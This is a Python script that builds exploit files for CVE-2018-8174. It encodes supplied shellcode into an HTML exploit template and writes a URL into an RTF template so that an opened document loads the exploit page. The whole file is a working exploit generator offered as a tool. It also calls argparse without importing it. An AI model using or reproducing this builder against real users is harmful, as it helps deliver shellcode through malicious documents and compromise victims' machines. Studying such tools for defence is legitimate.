import binascii

import utils

template_html = utils.basedir('exploits/templates/CVE-2018-8174.html')
template_rtf = utils.basedir('exploits/templates/CVE-2018-8174.rtf')

def encode_shellcode(shellcode):
    # pad
    if len(shellcode) % 2 != 0:
        shellcode += b'A'

    hexed = binascii.hexlify(shellcode).decode()
    chunks = utils.chunkup(hexed, 4)
    encoded = ''.join('%u{}{}'.format(chunk[2:], chunk[:2]) for chunk in chunks)

    return encoded

def generate_html(shellcode):
    # encode shellcode
    encoded = encode_shellcode(shellcode)

    # read template
    with open(template_html, 'r') as fp:
        html = fp.read()

    # modify template
    html = html.replace('SHELLCODE', encoded)

    return html

def generate_rtf(url):
    # read template
    with open(template_rtf, 'r') as fp:
        rtf = fp.read()

    hexed = binascii.hexlify(url.encode()).decode()
    normal_url = hexed

    if len(normal_url) > 78:
        return None

    # pad it
    normal_url = normal_url.ljust(78, '0')

    unicode_url = ''.join(c + '00' for c in utils.chunkup(hexed, 2))
    unicode_url = unicode_url.ljust(154, '0')

    rtf = rtf.replace('NORMAL_URL', normal_url)
    rtf = rtf.replace('UNICODE_URL', unicode_url)

    return rtf

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-D', '--debug', action='store_true', help='enable debug')
    parser.add_argument('--html-out', help='html out')
    parser.add_argument('--shellcode', help='shellcode for html')
    parser.add_argument('--rtf-out', help='rtf out')
    parser.add_argument('--url', help='url for rtf')
    args = parser.parse_args()

    # -D/--debug
    utils.enable_debug = args.debug

    # generate html
    if args.html_out:
        with open(args.shellcode, 'rb') as fp:
            shellcode = fp.read()

        html = generate_html(shellcode)

        with open(args.html_out, 'w+') as fp:
            fp.write(html)

    # generate rtf
    if args.rtf_out:
        rtf = generate_rtf(args.url)

        with open(args.rtf_out, 'w+') as fp:
            fp.write(rtf)

if __name__ == '__main__':
    main()
